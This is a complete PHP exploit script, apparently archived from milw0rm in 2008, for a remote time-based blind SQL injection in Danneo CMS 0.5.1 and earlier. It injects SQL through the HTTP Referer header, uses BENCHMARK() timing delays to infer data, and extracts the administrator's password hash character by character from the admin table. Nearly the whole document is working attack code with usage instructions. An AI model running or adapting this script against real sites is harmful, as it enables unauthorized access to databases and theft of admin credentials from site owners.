@@ -1,0 +1,174 @@
+<?php
+## Danneo CMS <= 0.5.1 Remote Blind SQL Injection Exploit
+## Software site: http://www.danneo.com/
+## By InATeam (http://inattack.ru/)
+## Requires "Referers statistics" option turned ON!
+
+echo "------------------------------------------------------------\n";
+echo "Danneo CMS <= 0.5.1 Remote Blind SQL Injection Exploit\n";
+echo "(c)oded by Raz0r, InATeam (http://inattack.ru/)\n";
+echo "Requires \"Referers statistics\" option turned ON!\n";
+echo "------------------------------------------------------------\n";
+
+if ($argc<2) {
+   echo "USAGE:\n";
+   echo "~~~~~~\n";
+   echo "php {$argv[0]} [url] OPTIONS\n\n";
+   echo "[url]        - target server where Danneo CMS is installed\n\n";
+   echo "OPTIONS:\n";
+   echo "-p=<prefix>  - use specific prefix\n";
+   echo "-id=<id>     - use specific user id (default 1)\n";
+   echo "-c=<count>   - benchmark()'s loop count (default 300000)\n";
+   echo "-v           - verbose mode\n\n";
+   echo "tip:\n";
+   echo "use bigger number of <count> if server is slow\n\n";
+   echo "php {$argv[0]} http://site.com/ -p=cms_\n";
+   echo "php {$argv[0]} http://cms.site.com:8080/ -id=2\n";
+   die;
+}
+
+error_reporting(0);
+set_time_limit(0);
+ini_set("max_execution_time",0);
+ini_set("default_socket_timeout",25);
+$url = $argv[1];
+for($i=2;$i<$argc;$i++) {
+   if(strpos($argv[$i],"=")!=false) {
+       $exploded=explode("=",$argv[$i]);
+       if ($exploded[0]=='-p') $prefix = $exploded[1];
+       if ($exploded[0]=='-id') $id = $exploded[1];
+       if ($exploded[0]=='-c') $benchmark = $exploded[1];
+   }
+   elseif($argv[$i] == '-v') $verbose=true;
+}
+if (!isset($id)) $id = 1;
+if (!isset($benchmark)) $benchmark = 300000;
+if (!isset($verbose)) $verbose=false;
+$url_parts = parse_url($url);
+$host = $url_parts['host'];
+$port = (isset($url_parts['port']) ? $url_parts['port'] : 80);
+$path = $url_parts['path'];
+$query_pattern   = "-99' OR IF(%s,BENCHMARK(%d,MD5(31337)),1)/*";
+$verbose_pattern = "%-12s %2d: %s";
+print "[~] Testing probe delays...\n";
+$ok=true; $nodelay=0; $withdelay=0;
+for ($i=1;$i<=3;$i++){
+   $query = sprintf($query_pattern, "1=1", 1);
+   $fdelay = dorequest($query,false,true);
+   if ($fdelay!==false) $nodelay+=$fdelay; else {$ok=false;break;}
+   $query = sprintf($query_pattern, "1=1", $benchmark);
+   $sdelay = dorequest($query,false,true);
+   if ($sdelay!==false) $withdelay+=$sdelay;  else {$ok=false;break;}
+   if ($sdelay<=($fdelay*2)) {$ok=false;break;}
+   usleep($benchmark/1000); $delay=false;
+}
+if ($ok) {
+   $nondelayed = $nodelay/3;
+   print "[+] Average nondelayed queries response time: ".round($nondelayed,1)." dsecs\n";
+   $delayed = $withdelay/3;
+   print "[+] Average delayed queries response time: ".round($delayed,1)." dsecs\n";
+}
+else die("[-] Exploit failed\n");
+
+if (isset($GLOBALS['version'])) {
+   echo "[+] Version {$GLOBALS['version']} has been detected\n";
+   $v = str_replace(".","",$GLOBALS['version']);
+}
+if (isset($prefix)) {$usedprefix = $prefix; echo "[~] Using prefix $prefix\n";}
+elseif (isset($v)) {$usedprefix = "dn{$v}_"; echo "[~] Using prefix dn{$v}_\n";}
+else {$usedprefix = "dn_"; echo "[~] Using prefix dn_\n";}
+
+print "    Getting hash...";
+if ($verbose) {print "\r[~]"; print "\n";}
+$hash='';
+for($i=1; $i<=32; $i++) {
+   $chr = gethashchar($i);
+   if($chr!==false) $hash .= $chr;
+   else {
+       $chr = gethashchar($i);
+       if ($chr !==false)$hash .= $chr;
+       else die("\n[-] Exploit failed\n");          }   }
+if (!$verbose) {print "\r[~]"; print "\n";}
+print "[+] Result: {$hash}\n";
+
+function gethashchar ($pos) {
+   global $query_pattern,$verbose_pattern,$usedprefix,$id,$benchmark,$verbose;
+   $inj = "ORD(SUBSTRING((SELECT adpwd FROM {$usedprefix}admin WHERE admid={$id}),{$pos},1))";
+   $query = sprintf($query_pattern, $inj.">57", $benchmark*4);
+   $success = condition($query);
+   if (!$success) {
+       if ($verbose) printf($verbose_pattern,"[v] Position",$pos,"char is [0-9]\n");
+       $min = 48;
+       $max = 57;          }
+   else {
+       if ($verbose) printf($verbose_pattern,"[v] Position",$pos,"char is [a-f]\n");
+       $min = 97;
+       $max = 102;          }
+   for($i=$min;$i<=$max;$i++) {
+       $query = sprintf($query_pattern, $inj."=".$i, $benchmark*4);
+       $success = condition($query);
+       if ($success) {
+           $query = sprintf($query_pattern, $inj."<>".$i, $benchmark*4);
+           $recheck = condition($query);
+           if (!$recheck) {
+               $chr = chr($i);
+               if ($verbose) printf($verbose_pattern,"[v] Position",$pos,"char is {$chr}\n");
+               return $chr;
+           }
+       }
+   }
+   return false;
+}
+function condition($query) {
+   global $delayed,$benchmark,$verbose,$verbose_pattern;
+   for($attempt = 1; $attempt <= 10; $attempt++){
+       $delay = dorequest($query,true);
+       if ($delay === false) {
+           if ($verbose) printf($verbose_pattern,"[v] Attempt",$attempt,"error\n");
+       }
+       else {
+           if ($verbose) printf($verbose_pattern,"[v] Attempt",$attempt,"success (delay is ".sprintf("%-3d",$delay)." dsecs)\n");                      break;
+       }
+   }
+   if ($attempt == 10) die("[-] Exploit failed\n");
+   if($delay > ($delayed * 2)) {
+       usleep(($benchmark*4)/1000);
+       return true;      }
+   return false;
+}
+function dorequest($query,$gethash=false,$getversion=false) {
+   global $host,$port,$path,$verbose;
+   if ($gethash&&!$verbose) status();
+   $start = getmicrotime();
+   $s = fsockopen(gethostbyname($host),$port);
+   if (!$s) return false;
+   else {
+       $packet  = "GET {$path}index.php HTTP/1.0\r\n";
+       $packet .= "Host: {$host}\r\n";
+       $packet .= "User-Agent: InAttack User Agent\r\n";
+       $packet .= "Referer: {$query}\r\n";
+       $packet .= "Connection: Close\r\n\r\n";
+       fputs($s, $packet);
+       $html='';
+       while (!feof($s)) $html.=fgets($s);
+       if ($getversion && !isset($GLOBALS['version'])) {
+           $out=array();
+           if (preg_match("@<META NAME=\"GENERATOR\" CONTENT=\"Danneo CMS ([^>]+)\">@i",$html,$out)) $GLOBALS['version']=$out[1];
+       }
+       $end = getmicrotime();
+   }
+   return intval(($end-$start)*10);
+}
+function status() {
+   static $n;
+   $n++;
+   if ($n > 3) $n = 0;
+   if($n==0){ print "\r[-]\r"; }
+   if($n==1){ print "\r[\\]\r";}
+   if($n==2){ print "\r[|]\r"; }
+   if($n==3){ print "\r[/]\r"; }
+}
+function getmicrotime() {return array_sum(explode(" ", microtime()));}
+?>
+
+# milw0rm.com [2008-03-11]
